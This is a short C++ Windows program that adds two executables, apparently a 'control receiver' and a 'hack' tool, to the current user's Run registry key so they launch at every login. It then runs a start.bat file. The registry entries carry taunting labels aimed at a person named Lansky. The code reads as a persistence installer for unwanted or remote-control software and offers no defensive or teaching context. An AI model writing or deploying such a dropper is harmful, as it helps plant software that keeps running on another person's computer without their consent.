#include <iostream>
#include <windows.h>
#include <string>
#include <filesystem>

using namespace std::filesystem;

bool add_to_autostart(std::wstring path, std::wstring label) {
    HKEY hkey;
    LSTATUS create_status = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    if (create_status != 0) {
        std::cerr << "Failed to create key" << std::endl;
        return false;
    }
    LONG status = RegSetValueExW(hkey, label.c_str(), 0, REG_SZ, (BYTE*)path.c_str(), (path.size()+1) * sizeof(wchar_t));
    if (status != 0) {
        std::cerr << "Failed to set value" << std::endl;
        return false;
    }
    return true;
}

int main() {
    setlocale(LC_ALL, "russian");
    path cur_path = current_path();
    path control_reciver_filename = L"control_reciver.exe";
    path mega_hack_ass_filename = L"mega_hack_ass.exe";
    path control_reciver_full_path = cur_path / control_reciver_filename;
    path mega_hack_ass_full_path = cur_path / mega_hack_ass_filename;

    std::wstring control_reciver = control_reciver_full_path.wstring();
    std::wstring mega_hack_ass = mega_hack_ass_full_path.wstring();

    bool rec_rez = add_to_autostart(control_reciver, L"Lansky loh");
    bool hack_rez = add_to_autostart(mega_hack_ass, L"Lansky giga loh");

    if (!rec_rez) {
        std::cout << "Failed to add control_reciver.exe to autostart" << std::endl;
    }
    if (!hack_rez) {
        std::cout << "Failed tot add mega_hack_ass.exe to autostart" << std::endl;
    }

    path starter_filename = "start.bat";
    path starter_full_path = cur_path / starter_filename;
    std::wstring starter = starter_full_path.wstring();

    _wsystem(starter.c_str());
}